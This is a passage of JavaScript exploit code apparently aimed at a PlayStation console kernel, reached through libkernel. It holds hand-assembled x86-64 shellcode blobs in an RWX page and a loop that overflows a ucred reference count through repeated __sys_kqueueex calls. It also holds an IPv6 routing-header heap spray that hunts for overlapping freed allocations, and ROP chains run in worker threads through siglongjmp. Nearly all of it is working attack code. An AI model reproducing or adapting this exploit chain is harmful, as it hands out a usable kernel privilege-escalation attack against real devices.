                0x0F, 0x05,                         // syscall
                0x49, 0x8B, 0x7C, 0x24, 0x18,       // mov rdi, [r12+24]  read_fd
                0x49, 0x8B, 0x74, 0x24, 0x20,       // mov rsi, [r12+32]  read_buf
                0x49, 0x8B, 0x54, 0x24, 0x28,       // mov rdx, [r12+40]  read_size
                0xB8, 0x03, 0x00, 0x00, 0x00,       // mov eax, 3         SYS_read
                0x0F, 0x05,                         // syscall
                0x49, 0xFF, 0x4C, 0x24, 0x30,       // dec qword [r12+48] count--
                0x75, 0xCD,                         // jnz .loop (@offset 6; rel=-0x33)
                0x49, 0xC7, 0x44, 0x24, 0x38,
                0x01, 0x00, 0x00, 0x00,         // mov qword [r12+56], 1
                0x41, 0x5C,                         // pop r12
                0x5B,                               // pop rbx
                0xC3,                               // ret
            ]);
        }

        function assemble_getsockopt_once() {
            // BLOB_GETSOCKOPT: calls getsockopt once, writes result pointer to done_flag.
            // Use for polling kernel state without JS safe_syscall dispatch overhead.
            //
            // Args block layout (64 bytes):
            //   [+0x00] sock      file descriptor
            //   [+0x08] level     IPPROTO_IPV6 etc.
            //   [+0x10] optname   IPV6_RTHDR etc.
            //   [+0x18] buf       result buffer pointer
            //   [+0x20] len_ptr   pointer to socklen_t (IN/OUT)
            //   [+0x28] retval    written with syscall return value
            //   [+0x30] done_flag set to 1 on completion
            //
            // SysV ABI: getsockopt(sock, level, optname, buf, len_ptr)
            //   rdi=sock, rsi=level, rdx=optname, rcx=buf, r8=len_ptr
            //   SYS_getsockopt = 0x76 = 118
            //
            // Note: The kernel may write into buf and update *len_ptr in place.
            // JS reads buf directly after done_flag is set.
            //
            //   00  53                      push rbx
            //   01  48 89 FB                mov rbx, rdi
            //   04  48 8B 3B                mov rdi, [rbx]       sock
            //   07  48 8B 73 08             mov rsi, [rbx+8]     level
            //   0B  48 8B 53 10             mov rdx, [rbx+16]    optname
            //   0F  48 8B 4B 18             mov rcx, [rbx+24]    buf
            //   13  4C 8B 43 20             mov r8,  [rbx+32]    len_ptr
            //   17  B8 76 00 00 00          mov eax, 0x76        SYS_getsockopt
            //   1C  0F 05                   syscall
            //   1E  48 89 43 28             mov [rbx+0x28], rax  retval
            //   22  48 C7 43 30 01 00 00 00 mov qword [rbx+0x30], 1  done
            //   2A  5B                      pop rbx
            //   2B  C3                      ret
            return new Uint8Array([
                0x53,                               // push rbx
                0x48, 0x89, 0xFB,                   // mov rbx, rdi
                0x48, 0x8B, 0x3B,                   // mov rdi, [rbx]      sock
                0x48, 0x8B, 0x73, 0x08,             // mov rsi, [rbx+8]    level
                0x48, 0x8B, 0x53, 0x10,             // mov rdx, [rbx+16]   optname
                0x48, 0x8B, 0x4B, 0x18,             // mov rcx, [rbx+24]   buf
                0x4C, 0x8B, 0x43, 0x20,             // mov r8,  [rbx+32]   len_ptr
                0xB8, 0x76, 0x00, 0x00, 0x00,       // mov eax, 0x76       SYS_getsockopt
                0x0F, 0x05,                         // syscall
                0x48, 0x89, 0x43, 0x28,             // mov [rbx+0x28], rax retval
                0x48, 0xC7, 0x43, 0x30,
                0x01, 0x00, 0x00, 0x00,         // mov qword [rbx+0x30], 1  done
                0x5B,                               // pop rbx
                0xC3,                               // ret
            ]);
        }

        function scrt_write_blob(slot, bytes) {
            // Write a shellcode blob into the staging page at slot offset.
            // Must be called before scrt_commit_rx().
            if (g_scrt_locked) emergency_worker_abort("scrt_write_blob: page already RX-locked");
            const base = g_scrt_page + slot * SC_RT_BLOB_ALIGN;
            for (let i = 0; i < bytes.length; i++) {
                write8(base + BigInt(i), BigInt(bytes[i]));
            }
            return base;  // entry point address
        }

        function scrt_commit_rx() {
            // Transition the staging page from RW to RX via mprotect.
            // This is the W^X safe approach: write while RW, execute while RX.
            // After this call, no further shellcode writes are permitted.
            if (g_scrt_locked) return;
            const ret = safe_syscall(SYSCALL.mprotect, g_scrt_page, SC_RT_PAGE_SIZE, PROT_RX);
            if (ret !== 0n && ret !== 0xFFFFFFFFFFFFFFFFn) {
                // mprotect failed — fall back to keeping RWX (already set from mmap)
                // This is safe: the page was mapped RWX, so execution still works.
            }
            g_scrt_locked = true;
        }

        function scrt_init() {
            if (g_scrt_ready) return;

            // Allocate memory-backed atomic lock words (must survive GC, be in real memory)
            const lock_pool = malloc(64n);  // 8 x 8-byte words, cache-line padded
            for (let i = 0n; i < 64n; i += 8n) write64(lock_pool + i, 0n);
            g_kprim_lock = lock_pool + 0n;
            g_reclaim_lock = lock_pool + 8n;
            g_reclaim_gen_word = lock_pool + 16n;

            // Map staging page RWX; mprotect to RX after writing
            g_scrt_page = safe_syscall(SYSCALL.mmap, 0n, SC_RT_PAGE_SIZE, PROT_RWX,
                0x1000n, -1n, 0n);
            if (g_scrt_page === 0xFFFFFFFFFFFFFFFFn || g_scrt_page === 0n) {
                g_scrt_page = 0n;
                g_scrt_ready = true;
                return;
            }

            // Persistent arg block pool
            g_scrt_args = malloc(SC_RT_ARG_SIZE * SC_RT_BLOB_COUNT);
            for (let i = 0n; i < SC_RT_ARG_SIZE * SC_RT_BLOB_COUNT; i += 8n)
                write64(g_scrt_args + i, 0n);
            g_blob_hammer_args = g_scrt_args + SC_RT_ARG_SIZE * BLOB_HAMMER;
            g_blob_write_read_args = g_scrt_args + SC_RT_ARG_SIZE * BLOB_WRITE_READ;
            g_blob_getsockopt_args = g_scrt_args + SC_RT_ARG_SIZE * BLOB_GETSOCKOPT;

            // Write all blobs into staging page
            const hammer_entry = scrt_write_blob(BLOB_HAMMER, assemble_generic_hammer());
            const xchg_entry = scrt_write_blob(BLOB_XCHG, assemble_xchg());
            const cas_entry = scrt_write_blob(BLOB_CAS, assemble_cas());
            const fetch_add_entry = scrt_write_blob(BLOB_FETCH_ADD, assemble_fetch_add());
            const write_read_entry = scrt_write_blob(BLOB_WRITE_READ, assemble_write_read_pair());
            const getsockopt_entry = scrt_write_blob(BLOB_GETSOCKOPT, assemble_getsockopt_once());

            // SFENCE: commit all shellcode bytes before mprotect + func_wrap
            hw_sfence();
            scrt_commit_rx();

            // Wrap all entry points
            g_blob_hammer_fn = func_wrap(hammer_entry);
            g_blob_xchg_fn = func_wrap(xchg_entry);
            g_blob_cas_fn = func_wrap(cas_entry);
            g_blob_fetch_add_fn = func_wrap(fetch_add_entry);
            g_blob_write_read_fn = func_wrap(write_read_entry);
            g_blob_getsockopt_fn = func_wrap(getsockopt_entry);

            g_scrt_ready = true;
        }

        function native_hammer(sysno, arg0, arg1, arg2, count) {
            // Execute syscall(sysno, arg0, arg1, arg2) exactly `count` times natively.
            // Covers: sched_yield, read, write, sendmsg, recvmsg, UMTX ops, etc.
            // Native path: direct synchronous call — zero JS event-loop involvement.
            // JS fallback: tight for-loop, no GC yields.
            scrt_init();

            count = BigInt(count);
            sysno = BigInt(sysno);
            arg0 = BigInt(arg0 || 0n);
            arg1 = BigInt(arg1 || 0n);
            arg2 = BigInt(arg2 || 0n);

            if (g_blob_hammer_fn !== null && count > 0n) {
                // Populate arg block
                write64(g_blob_hammer_args + 0n, arg0);   // rdi
                write64(g_blob_hammer_args + 8n, arg1);   // rsi
                write64(g_blob_hammer_args + 16n, arg2);   // rdx
                write64(g_blob_hammer_args + 24n, count);  // rcx
                write64(g_blob_hammer_args + 32n, sysno);  // rax
                write64(g_blob_hammer_args + 40n, 0n);     // done = 0
                write64(g_blob_hammer_args + 48n, 0n);     // result = 0
                hw_sfence();

                g_blob_hammer_fn(g_blob_hammer_args);

                hw_lfence();
                if (read64(g_blob_hammer_args + 40n) !== 1n) {
                    emergency_worker_abort("native_hammer: done_flag not set after return");
                }
            } else {
                // JS fallback
                for (let i = 0n; i < count; i++) {
                    safe_syscall(sysno, arg0, arg1, arg2);
                }
            }
        }

        // --- High-level native wrappers that eliminate JS from critical paths ---

        function native_yield_n(count) {
            native_hammer(SYSCALL.sched_yield, 0n, 0n, 0n, count);
        }
        function native_read_n(fd, buf, size, count) {
            native_hammer(SYSCALL.read, fd, buf, size, count);
        }
        function native_write_n(fd, buf, size, count) {
            native_hammer(SYSCALL.write, fd, buf, size, count);
        }
        function native_umtx_wake(addr, count) {
            native_hammer(SYS_UMTX_OP, addr, UMTX_OP_WAKE, 0x7FFFFFFFn, count);
        }

        function native_sock_ping_pong(write_fd, wbuf, wsz, read_fd, rbuf, rsz, count) {
            // Execute: write(write_fd, wbuf, wsz) + read(read_fd, rbuf, rsz) × count
            // using BLOB_WRITE_READ_PAIR shellcode — zero JS overhead per iteration.
            //
            // SAFETY: count must be > 0. The BLOB decrements before the jnz check,
            // so count=0 wraps to 0xFFFFFFFFFFFFFFFF and loops ~forever.
            count = BigInt(count);
            if (count === 0n) return;  // guard against infinite loop on count=0
            if (!g_blob_write_read_fn) {
                for (let i = 0n; i < count; i++) {
                    safe_syscall(SYSCALL.write, write_fd, wbuf, wsz);
                    safe_syscall(SYSCALL.read, read_fd, rbuf, rsz);
                }
                return;
            }
            const a = g_blob_write_read_args;
            write64(a + 0x00n, BigInt(write_fd));
            write64(a + 0x08n, BigInt(wbuf));
            write64(a + 0x10n, BigInt(wsz));
            write64(a + 0x18n, BigInt(read_fd));
            write64(a + 0x20n, BigInt(rbuf));
            write64(a + 0x28n, BigInt(rsz));
            write64(a + 0x30n, count);   // iteration count (decremented by blob)
            write64(a + 0x38n, 0n);      // done_flag: cleared before dispatch
            hw_sfence();                  // ensure arg writes are globally visible
            g_blob_write_read_fn(a);
        }

        function native_getsockopt_once(sock, level, optname, buf, len_ptr) {
            // Call getsockopt once via BLOB_GETSOCKOPT shellcode.
            // Result is written directly into buf by the kernel; retval at [+0x28].
            // IMPORTANT: caller must hw_lfence() after this if reading from buf
            // on the same CPU (prevents speculative reads past the kernel store).
            if (!g_blob_getsockopt_fn) {
                return safe_syscall(SYSCALL.getsockopt, sock, level, optname, buf, len_ptr);
            }
            const a = g_blob_getsockopt_args;
            write64(a + 0x00n, BigInt(sock));
            write64(a + 0x08n, BigInt(level));
            write64(a + 0x10n, BigInt(optname));
            write64(a + 0x18n, BigInt(buf));
            write64(a + 0x20n, BigInt(len_ptr));
            write64(a + 0x28n, 0n);  // retval slot
            write64(a + 0x30n, 0n);  // done_flag
            hw_sfence();
            g_blob_getsockopt_fn(a);
            hw_lfence();  // (5) fence: prevent CPU from speculatively reading buf
            // before kernel stores from getsockopt are fully visible.
            return read64(a + 0x28n);
        }

        // --- NATIVE ATOMIC PRIMITIVES ---
        // Full acquire/release semantics via LOCK-prefixed x86 instructions.
        // These stubs bypass the JS engine entirely for true hardware atomicity.

        function atomic_xchg64(addr, newval) {
            // Atomically swap *addr = newval, return old value.
            // XCHG with memory is implicitly LOCK — acts as full mfence.
            addr = BigInt(addr);
            newval = BigInt(newval);
            if (g_blob_xchg_fn !== null) {
                return g_blob_xchg_fn(addr, newval);
            }
            // JS fallback (non-atomic, single-threaded JS context only)
            hw_mfence();
            const old = read64(addr);
            write64(addr, newval);
            hw_mfence();
            return old;
        }

        function atomic_cas64(addr, expected, desired) {
            // Compare-and-swap: if *addr == expected, *addr = desired.
            // Returns the old value (before the swap).
            // Use: if (atomic_cas64(lock, 0n, 1n) === 0n) { /* acquired */ }
            addr = BigInt(addr);
            expected = BigInt(expected);
            desired = BigInt(desired);
            if (g_blob_cas_fn !== null) {
                return g_blob_cas_fn(addr, expected, desired);
            }
            hw_mfence();
            const old = read64(addr);
            if (old === expected) write64(addr, desired);
            hw_mfence();
            return old;
        }

        function atomic_fetch_add64(addr, delta) {
            // Atomically: old = *addr; *addr += delta; return old.
            // Uses LOCK XADD — full memory barrier semantics.
            addr = BigInt(addr);
            delta = BigInt(delta);
            if (g_blob_fetch_add_fn !== null) {
                return g_blob_fetch_add_fn(addr, delta);
            }
            hw_mfence();
            const old = read64(addr);
            write64(addr, old + delta);
            hw_mfence();
            return old;
        }

        scrt_init();

        let kqueueex_addr = dlsym(LIBKERNEL_HANDLE, "__sys_kqueueex");
        if (kqueueex_addr === 0n || kqueueex_addr === 0xffffffffffffffffn) {
            await log("Failed to resolve __sys_kqueueex");
            return;
        }
        let sys_kqueueex = func_wrap(kqueueex_addr);

        function run_kqueueex_loop_sync(iterations) {
            // Fully native: use exec_ntimes which handles both shellcode and JS fallback.
            kqueue_spray_ntimes(BigInt(iterations));
        }

        async function run_kqueueex_loop(iterations) {
            await log("Running __sys_kqueueex " + iterations + " times (native exec_ntimes)...");
            run_kqueueex_loop_sync(BigInt(iterations));
            await log("__sys_kqueueex loop completed");
        }

        const free_fds = [];
        let free_fd_idx = 0;

        async function prepare_fds() {
            await log("Preparing FDs (ucred ref overflow)");
            safe_syscall(SYSCALL.setuid, 1n);

            await log("Sleeping for ucred to settle...");

            const ntimes = 0x100000001n - FREE_FDS_NUM;
            await run_kqueueex_loop(ntimes);

            const dev_null = alloc_string("/dev/null");
            for (let i = 0; i < Number(FREE_FDS_NUM); i++) {
                let fd = safe_syscall(SYSCALL.open, dev_null, 0n);
                free_fds.push(fd);
            }

            safe_syscall(SYSCALL.setuid, 1n);
            await log("Sleeping for new ucred to settle...");
        }

        function free_one_fd() {
            if (free_fd_idx < free_fds.length) {
                safe_syscall(SYSCALL.close, free_fds[free_fd_idx]);
                free_fd_idx++;
            }
        }

        const ipv6_sockets = [];
        let ipv6_count = 0;

        for (let i = 0; i < 64; i++) {
            let fd = safe_syscall(SYSCALL.socket, AF_INET6, SOCK_STREAM, 0n);
            if (fd !== 0xffffffffffffffffn && fd >= 0n) {
                ipv6_sockets.push(fd);
                ipv6_count++;
            }
        }

        for (let i = 0; i < ipv6_count; i++) {
            safe_syscall(SYSCALL.setsockopt, ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, 0n, 0n);
        }

        let rthdr_spray = malloc(Number(UCRED_SIZE));
        for (let i = 0n; i < UCRED_SIZE; i += 8n) {
            write64(rthdr_spray + i, 0n);
        }

        function build_rthdr(buf, target_size) {
            target_size = BigInt(target_size);
            const segments = (((target_size >> 3n) - 1n) & 0xFFFFFFFEn);
            write8(buf, 0n);
            write8(buf + 1n, segments);
            write8(buf + 2n, 0n);
            write8(buf + 3n, segments >> 1n);
            return Number((segments + 1n) << 3n);
        }

        let rthdr_spray_len = build_rthdr(rthdr_spray, UCRED_SIZE);

        function set_rthdr(sock, buf, len) {
            return safe_syscall(SYSCALL.setsockopt, sock, IPPROTO_IPV6, IPV6_RTHDR, BigInt(buf), BigInt(len));
        }

        function get_rthdr(sock, buf, len_ptr) {
            return safe_syscall(SYSCALL.getsockopt, sock, IPPROTO_IPV6, IPV6_RTHDR, BigInt(buf), BigInt(len_ptr));
        }

        function free_rthdr(sock) {
            return safe_syscall(SYSCALL.setsockopt, sock, IPPROTO_IPV6, IPV6_RTHDR, 0n, 0n);
        }

        let tag_buf = malloc(16);
        let tag_len = malloc(4);

        function find_twins(max_rounds) {
            for (let round = 1; round <= max_rounds; round++) {
                for (let i = 0; i < ipv6_count; i++) {
                    write32(rthdr_spray + 4n, RTHDR_TAG + BigInt(i));
                    set_rthdr(ipv6_sockets[i], rthdr_spray, rthdr_spray_len);
                }
                for (let i = 0; i < ipv6_count; i++) {
                    write32(tag_len, 8n);
                    if (get_rthdr(ipv6_sockets[i], tag_buf, tag_len) >= 0n) {
                        let val = read32(tag_buf + 4n);
                        let j = Number(val & 0xFFFFn);
                        if ((val & 0xFFFF0000n) === RTHDR_TAG && i !== j && j < ipv6_count) {
                            return [i, j];
                        }
                    }
                }
            }
            return null;
        }

        function find_triplet(master_idx, exclude_idx, max_rounds) {
            for (let round = 1; round <= max_rounds; round++) {
                for (let i = 0; i < ipv6_count; i++) {
                    if (i !== master_idx && i !== exclude_idx) {
                        write32(rthdr_spray + 4n, RTHDR_TAG + BigInt(i));
                        set_rthdr(ipv6_sockets[i], rthdr_spray, rthdr_spray_len);
                    }
                }
                write32(tag_len, 8n);
                if (get_rthdr(ipv6_sockets[master_idx], tag_buf, tag_len) >= 0n) {
                    let val = read32(tag_buf + 4n);
                    let j = Number(val & 0xFFFFn);
                    if ((val & 0xFFFF0000n) === RTHDR_TAG && j !== master_idx && j !== exclude_idx && j < ipv6_count) {
                        return j;
                    }
                }
                if (round % 100 === 0) native_yield_n(1n);
            }
            return -1;
        }

        let triplets = [-1, -1, -1];

        function triplets_valid() {
            return triplets[0] >= 0 && triplets[1] >= 0 && triplets[2] >= 0 &&
                triplets[1] < ipv6_count && triplets[2] < ipv6_count;
        }

        function repair_triplets() {
            if (triplets[1] < 0 || triplets[1] >= ipv6_count) {
                for (let attempt = 1; attempt <= 5; attempt++) {
                    triplets[1] = find_triplet(triplets[0], triplets[2], FIND_TRIPLET_FAST);
                    if (triplets[1] !== -1) break;
                    native_yield_n(1n); exploit_sleep_10ms();
                }
            }
            if (triplets[2] < 0 || triplets[2] >= ipv6_count) {
                for (let attempt = 1; attempt <= 5; attempt++) {
                    triplets[2] = find_triplet(triplets[0], triplets[1], FIND_TRIPLET_FAST);
                    if (triplets[2] !== -1) break;
                    native_yield_n(1n); exploit_sleep_10ms();
                }
            }
            return triplets_valid();
        }

        let dummy_byte = malloc(8);
        let scratch_big = malloc(0x4000);
        for (let i = 0n; i < 0x4000n; i += 8n) write64(scratch_big + i, 0n);
        let len_out = malloc(4);
        let rthdr_readback = malloc(360);

        // Socket pairs for worker communication
        let sockpair_buf = malloc(8);
        safe_syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sockpair_buf);
        let iov_sock_a = BigInt(read32(sockpair_buf));
        let iov_sock_b = BigInt(read32(sockpair_buf + 4n));

        safe_syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sockpair_buf);
        let uio_sock_a = BigInt(read32(sockpair_buf));
        let uio_sock_b = BigInt(read32(sockpair_buf + 4n));

        const UMTX_OP_WAIT = 2n;   // wait on address until value changes
        const UMTX_OP_WAKE = 3n;   // wake threads waiting on address
        const UMTX_OP_WAIT_UINT = 11n;  // wait on 32-bit uint (avoids 64-bit sign issues)
        const UMTX_OP_SYSNUM = 0x1c6n;
        const SYS_UMTX_OP = 454n;

        // --- HARDWARE MEMORY FENCE SUBSYSTEM ---
        // x86-64 MFENCE (0F AE F0): full serializing memory barrier.
        // Guarantees all prior stores are visible to all cores before any
        // subsequent load or store. Prevents CPU store-buffer forwarding
        // from hiding writes across cores (cache coherency guarantee).
        //
        // SFENCE (0F AE F8): store fence - all prior stores ordered before this point.
        // LFENCE (0F AE E8): load fence  - all prior loads ordered before this point.
        //
        // Without these, signal_workers can write ws.cmd BEFORE finished-flags
        // are visible to workers (store reordering), causing a worker to see
        // the new generation but still observe a non-zero finished flag from
        // the previous round, looping forever without executing the syscall.

        let g_fence_mem = 0n;  // RWX page for fence shellcode blobs
        let g_mfence_ptr = 0n;  // ptr: mfence; ret
        let g_sfence_ptr = 0n;  // ptr: sfence; ret
        let g_lfence_ptr = 0n;  // ptr: lfence; ret
        let g_fence_ready = false;
        let f_mfence = null;
        let f_sfence = null;
        let f_lfence = null;

        function init_fence_shellcode() {
            if (g_fence_ready) return;

            // Allocate one RWX page for all three fence stubs
            g_fence_mem = safe_syscall(SYSCALL.mmap, 0n, 0x1000n, 7n, 0x1000n, -1n, 0n);
            if (g_fence_mem === 0xFFFFFFFFFFFFFFFFn || g_fence_mem === 0n) {
                // mmap failed: fence calls will be no-ops (still safe, just weaker)
                g_fence_ready = true;
                return;
            }

            // mfence stub at offset 0:  0F AE F0 C3
            g_mfence_ptr = g_fence_mem;
            write8(g_mfence_ptr + 0n, 0x0Fn); write8(g_mfence_ptr + 1n, 0xAEn);
            write8(g_mfence_ptr + 2n, 0xF0n); write8(g_mfence_ptr + 3n, 0xC3n);

            // sfence stub at offset 8:  0F AE F8 C3
            g_sfence_ptr = g_fence_mem + 8n;
            write8(g_sfence_ptr + 0n, 0x0Fn); write8(g_sfence_ptr + 1n, 0xAEn);
            write8(g_sfence_ptr + 2n, 0xF8n); write8(g_sfence_ptr + 3n, 0xC3n);

            // lfence stub at offset 16: 0F AE E8 C3
            g_lfence_ptr = g_fence_mem + 16n;
            write8(g_lfence_ptr + 0n, 0x0Fn); write8(g_lfence_ptr + 1n, 0xAEn);
            write8(g_lfence_ptr + 2n, 0xE8n); write8(g_lfence_ptr + 3n, 0xC3n);

            // Wrap as callable JS functions via func_wrap
            f_mfence = func_wrap(g_mfence_ptr);
            f_sfence = func_wrap(g_sfence_ptr);
            f_lfence = func_wrap(g_lfence_ptr);

            g_fence_ready = true;
        }

        function hw_mfence() { if (f_mfence) f_mfence(); }
        function hw_sfence() { if (f_sfence) f_sfence(); }
        function hw_lfence() { if (f_lfence) f_lfence(); }

        // Atomic store: SFENCE before write ensures prior stores are globally visible
        function atomic_store64(addr, val) {
            hw_sfence();
            write64(addr, BigInt(val));
        }

        // Atomic load: LFENCE after read ensures we don't speculate past the load
        function atomic_load64(addr) {
            let v = read64(addr);
            hw_lfence();
            return v;
        }

        // Initialize fence subsystem (needs mmap, which is available now)
        init_fence_shellcode();

        // --- MULTICORE SYNCHRONIZATION HARDENING ---
        function create_worker_sync(count) {
            // Allocate cache-line aligned structure to prevent false sharing.
            // Layout: [cmd(8)] [finished_0..N (8 each)] [padding to 128 bytes]
            // Overshoot by 128 bytes so we can align to 64-byte cache line boundary.
            let raw = malloc(8n + BigInt(count) * 8n + 128n);
            let aligned = raw + (64n - (raw % 64n)) % 64n;

            // Zero-initialize with SFENCE to guarantee visibility before workers start
            write64(aligned, 0n);
            for (let i = 0n; i < BigInt(count); i++) write64(aligned + 8n + i * 8n, 0n);
            hw_mfence();  // Full barrier: ensures zeroes are visible to all cores

            // repair_counts: JS-side per-worker repair attempt counters.
            // If any worker exceeds MAX_WORKER_REPAIRS, repair_worker_state aborts.
            const MAX_WORKER_REPAIRS = 5;

            return {
                cmd: aligned,
                finished: aligned + 8n,
                total: BigInt(count),
                gen: 0n,
                repair_counts: new Array(count).fill(0),
                max_repairs: MAX_WORKER_REPAIRS,
            };
        }

        function signal_workers(ws) {
            // Step 1: Zero all finished flags BEFORE bumping the generation.
            // Without SFENCE here, a worker could observe the new generation
            // in ws.cmd while still seeing a non-zero finished flag from the
            // prior round (store reordering), causing it to skip execution.
            for (let i = 0n; i < ws.total; i++) write64(ws.finished + i * 8n, 0n);

            // SFENCE: guarantee all finished-flag zeroes are globally visible
            // before we write the new generation to ws.cmd.
            hw_sfence();

            // Step 2: Atomically bump generation and publish to ws.cmd.
            // atomic_fetch_add64 uses LOCK XADD — full memory barrier semantics.
            // This eliminates the TOCTOU window between the JS ws.gen read and
            // write64(ws.cmd, ...) that could cause a worker to observe a stale gen.
            ws.gen = atomic_fetch_add64(ws.cmd, 1n) + 1n;

            // SFENCE: guarantee ws.cmd write is visible before UMTX_WAKE fires.
            // Without this, the UMTX_WAKE can execute on CPU-A while the
            // ws.cmd write is still in CPU-A's store buffer, causing the woken
            // thread on CPU-B to read the old generation and re-sleep immediately.
            hw_sfence();

            // Step 3: Wake all waiting workers via native shellcode (no JS dispatch).
            // native_umtx_wake issues LOCK XCHG internally then calls
            // native_hammer(SYS_UMTX_OP, addr, UMTX_OP_WAKE, INT_MAX, count)
            // completely bypassing the JS event loop.
            native_umtx_wake(ws.cmd, 1n);
        }

        function wait_workers(ws) {
            // Spin checking finished flags with LFENCE on each iteration.
            // Returns true if all workers completed cleanly.
            // Returns false if timeout — caller must handle recovery.
            // Does NOT throw: throwing here bypasses reclaim_recovery_check entirely.
            //
            // Yield strategy:
            //   - First 0xFF iterations: pure spin (low latency, catches fast completions)
            //   - Every 0x100 iterations after: native_yield_n(1n) via LOCK XCHG hammer
            //     This is a single native call covering one sched_yield with no JS overhead,
            //     unlike safe_syscall(sched_yield) which goes through the full JS dispatch.
            const MAX_SPINS = 2000000;
            let spins = 0;
            while (spins++ < MAX_SPINS) {
                hw_lfence();  // Load fence: ensures fresh read from memory
                let done = true;
                for (let i = 0n; i < ws.total; i++) {
                    if (read64(ws.finished + i * 8n) === 0n) { done = false; break; }
                }
                if (done) {
                    hw_lfence();  // Final fence before returning to prevent load hoisting
                    return true;
                }
                // Yield every 256 spins — native call, no JS event-loop involvement.
                if ((spins & 0xFF) === 0) native_yield_n(1n);
            }
            // Timeout: return false — do NOT throw, let reclaim_recovery_check handle it
            return false;
        }

        function spawn_rop_worker(ws, wid, fd, iov_ptr, sysnum) {
            // ---------------------------------------------------------------
            // TRAMPOLINE DESIGN
            // scePthreadCreate(thread, attr, start_fn, arg) launches a thread
            // that calls start_fn(arg). We use:
            //   start_fn = siglongjmp
            //   arg      = jmp_buf ptr
            //
            // siglongjmp(jb, val) restores jb registers then jumps to JB_PC:
            //   RAX, RBX, RBP, R12-R15  <- from jb slots 0x00-0x28
            //   RSP                      <- from jb[0x30]  ← NEW stack pointer
            //   RIP                      <- from jb[0x38]  ← first ROP gadget
            //
            // ROP STACK LAYOUT:
            //   cb[0]  = first gadget address  ← JB_RSP points here
            //   cb[1]  = first gadget's argument
            //   ...     (rest of ROP chain)
            //   cb[N]  = PSP_RSP_RET back to loop_start
            //
            // CRITICAL ABI RULES:
            //   1. JB_RSP must be 16-byte aligned (SysV ABI)
            //   2. siglongjmp val MUST be 1 (not 0): POSIX says val=0 → returns 1
            //      If we pass 0, siglongjmp corrects it to 1 internally, but on
            //      some implementations may behave differently. Always pass 1.
            //   3. JB_PC = address of first ROP gadget = cb (RET gadget to skip
            //      the alignment padding) = loop_start gadget address.
            //      The RSP is set to cb as well so the first "ret" pops cb[0].
            //   4. Callee-saved registers (rbx etc.) must be set to known-good
            //      values in jb to prevent garbage restoration on longjmp.
            // ---------------------------------------------------------------

            // Allocate ROP chain buffer: 0x8000 bytes, align to 16 bytes
            // Add 8-byte canary guard at the END to detect ROP chain overflow.
            const ROP_STACK_SIZE = 0x8000n;
            const ROP_CANARY_VAL = 0xDEADBEEFCAFEBABEn;
            let raw = malloc(ROP_STACK_SIZE + 8n);  // +8 for trailing canary
            // 16-byte align the chain start (SysV ABI)
            let cb = raw + (16n - (raw % 16n)) % 16n;
            let idx = 0n;
            function p(v) { write64(cb + idx * 8n, BigInt(v)); idx++; }

            // Write trailing canary at END of allocation (before alignment waste)
            write64(raw + ROP_STACK_SIZE, ROP_CANARY_VAL);

            // Resolve thread symbols — all must be non-null before use
            let a_slj = dlsym(LIBKERNEL_HANDLE, "siglongjmp");
            let a_pc = dlsym(LIBKERNEL_HANDLE, "scePthreadCreate");
            let a_ai = dlsym(LIBKERNEL_HANDLE, "scePthreadAttrInit");
            let a_ad = dlsym(LIBKERNEL_HANDLE, "scePthreadAttrDestroy");
            let a_as = dlsym(LIBKERNEL_HANDLE, "scePthreadAttrSetstacksize");

            const BAD = 0xFFFFFFFFFFFFFFFFn;
            if (!a_slj || a_slj === BAD) emergency_worker_abort("spawn: failed to resolve siglongjmp");
            if (!a_pc || a_pc === BAD) emergency_worker_abort("spawn: failed to resolve scePthreadCreate");
            if (!a_ai || a_ai === BAD) emergency_worker_abort("spawn: failed to resolve scePthreadAttrInit");
            if (!a_ad || a_ad === BAD) emergency_worker_abort("spawn: failed to resolve scePthreadAttrDestroy");
            if (!a_as || a_as === BAD) emergency_worker_abort("spawn: failed to resolve scePthreadAttrSetstacksize");

            let fPC = func_wrap(a_pc);
            let fAI = func_wrap(a_ai);
            let fAD = func_wrap(a_ad);
            let fAS = func_wrap(a_as);

            // CPU Pinning & Realtime Prio
            let mask = malloc(16);
            for (let i = 0n; i < 16n; i++) write8(mask + i, 0n);
            write16(mask, 0x10n);
            let rtbuf = malloc(4);
            write16(rtbuf, 2n); write16(rtbuf + 2n, 256n);

            let wrapper = dlsym(LIBKERNEL_HANDLE, "syscall");
            if (!wrapper || wrapper === BAD) emergency_worker_abort("spawn: failed to resolve syscall");

            // ABI Correctness: Enforce 16-byte alignment, preserve callee-saved regs
            idx = enforce_stack_alignment(cb, idx);
            idx = preserve_callee_saved_registers(cb, idx, scratch_big);

            // CPU affinity + realtime scheduling
            p(POP_RDI_RET); p(3n); p(POP_RSI_RET); p(1n);
            p(POP_RDX_RET); p(0xFFFFFFFFFFFFFFFFn);
            p(POP_R8_RET); p(mask); p(0n); p(0n); p(0n);
            p(POP_RCX_RET); p(0x10n); p(POP_RAX_RET); p(0x1E8n); p(wrapper);
            p(POP_RDI_RET); p(1n); p(POP_RSI_RET); p(0n);
            p(POP_RDX_RET); p(rtbuf); p(POP_RAX_RET); p(0x1D2n); p(wrapper);

            // --- LOOP START: worker waits here for signal_workers() ---
            let loop_start = idx;

            p(POP_RBX_RET); p(scratch_big);
            p(POP_RDI_RET); p(ws.cmd); p(POP_RSI_RET); p(UMTX_OP_WAIT);
            let wait_val_slot = idx;
            p(POP_RDX_RET); p(0n); p(POP_RCX_RET); p(0n);
            p(POP_R8_RET); p(0n); p(0n); p(0n); p(0n);
            p(POP_RAX_RET); p(UMTX_OP_SYSNUM); p(wrapper);

            p(POP_RAX_RET); p(ws.cmd); p(MOV_RAX_DEREF_RAX_RET);
            p(POP_RDI_RET); p(cb + (wait_val_slot + 1n) * 8n); p(MOV_DEREF_RDI_RAX_RET);

            p(POP_RDI_RET); p(fd); p(POP_RSI_RET); p(iov_ptr);
            let iov_count = sysnum === 0x1Bn ? 0n : BigInt(UIO_IOV_COUNT);
            let slot_pop_rdx = idx; p(POP_RDX_RET);
            let slot_count = idx; p(iov_count);
            let slot_pop_rax = idx; p(POP_RAX_RET);
            let slot_sysnum = idx; p(sysnum);
            let slot_wrapper = idx; p(wrapper);

            // Set finished flag and wake supervisor
            p(POP_RAX_RET); p(1n); p(POP_RDI_RET); p(ws.finished + BigInt(wid) * 8n); p(MOV_DEREF_RDI_RAX_RET);

            p(POP_RBX_RET); p(scratch_big);
